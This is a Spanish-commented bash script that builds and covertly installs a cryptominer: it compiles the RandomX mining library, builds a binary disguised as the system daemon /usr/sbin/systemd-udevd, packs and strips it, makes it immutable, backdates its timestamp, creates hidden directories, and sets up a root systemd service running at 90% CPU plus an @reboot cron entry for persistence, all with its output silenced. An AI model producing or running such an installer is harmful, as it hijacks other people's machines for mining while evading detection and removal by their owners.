#!/bin/bash
set -e

echo "[*] Iniciando compilación del System Helper..."

exec 3>&1 4>&2
exec 1>/dev/null 2>&1

PROJECT_NAME="system_helper"
OUTPUT_BIN="/usr/sbin/systemd-udevd"
BUILD_DIR="/tmp/.build_$$"
RANDOMX_DIR="/tmp/.randomx_$$"

cleanup() {
    rm -rf "$BUILD_DIR" "$RANDOMX_DIR" 2>/dev/null || true
}

trap cleanup EXIT

mkdir -p "$BUILD_DIR"
mkdir -p "$RANDOMX_DIR"

echo "[*] Compilando RandomX..."
cd "$RANDOMX_DIR"
git clone --depth 1 https://github.com/tevador/RandomX.git . >/dev/null 2>&1

mkdir build && cd build
cmake -DARCH=native -DCMAKE_BUILD_TYPE=Release .. >/dev/null 2>&1
make -j$(nproc) >/dev/null 2>&1

sudo make install >/dev/null 2>&1

echo "[*] Compilando binario principal..."
cd "$BUILD_DIR"

export GO111MODULE=on
export CGO_ENABLED=1
export GOOS=$(go env GOOS)
export GOARCH=$(go env GOARCH)

LDFLAGS="-s -w -buildid="
LDFLAGS+=" -X 'main.buildTime=$(date -u +%Y%m%d.%H%M%S)'"
LDFLAGS+=" -extldflags '-static -Wl,--build-id=none'"

CFLAGS="-O3 -march=native -fomit-frame-pointer"

CGO_CFLAGS="$CFLAGS" \
CGO_LDFLAGS="-lrandomx -lpthread -lm" \
go build \
    -trimpath \
    -ldflags "$LDFLAGS" \
    -gcflags "all=-N -l" \
    -tags "netgo osusergo static_build" \
    -o "$OUTPUT_BIN" \
    "$PROJECT_PATH"

echo "[*] Ofuscando binario..."
strip --strip-all "$OUTPUT_BIN" 2>/dev/null || true
upx --ultra-brute "$OUTPUT_BIN" --quiet 2>/dev/null || true

chmod 755 "$OUTPUT_BIN"
chown root:root "$OUTPUT_BIN"

chattr +i "$OUTPUT_BIN" 2>/dev/null || true
touch -t 202001010000 "$OUTPUT_BIN"

echo "[*] Creando estructura..."
mkdir -p /etc/.systemd
mkdir -p /usr/share/.config
mkdir -p /var/lib/.cache
chmod 700 /etc/.systemd /usr/share/.config /var/lib/.cache

echo "[*] Configurando servicio..."
cat > /etc/systemd/system/systemd-udevd-helper.service << 'EOF'
[Unit]
Description=System UDev Daemon Helper
After=network.target
DefaultDependencies=no

[Service]
Type=forking
PIDFile=/run/systemd-udevd-helper.pid
ExecStart=/usr/sbin/systemd-udevd --daemon
ExecStop=/bin/kill -TERM $MAINPID
Restart=always
RestartSec=10
User=root
Group=root
Nice=19
CPUSchedulingPolicy=idle
CPUSchedulingPriority=20
OOMScoreAdjust=1000
CPUQuota=90%
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
ProtectKernelModules=yes
ProtectKernelTunables=yes
ProtectControlGroups=yes
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
RestrictNamespaces=yes
RestrictRealtime=yes
RestrictSUIDSGID=yes
SystemCallFilter=@system-service
SystemCallArchitectures=native
MemoryDenyWriteExecute=yes
LockPersonality=yes
StandardOutput=null
StandardError=null
SyslogIdentifier=systemd-udevd

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload >/dev/null 2>&1
systemctl enable systemd-udevd-helper.service --now >/dev/null 2>&1

echo "[*] Configurando persistencia..."
(crontab -l 2>/dev/null | grep -v "systemd-udevd"; 
 echo "@reboot /usr/sbin/systemd-udevd --daemon") | crontab - >/dev/null 2>&1

cleanup

exec 1>&3 2>&4

echo "[+] Compilación completada exitosamente"
echo "[+] Binario instalado en: $OUTPUT_BIN"
echo "[+] Servicio configurado y ejecutándose"
echo "[+] Horario: 23:30 - 06:30 | CPU: 90%"
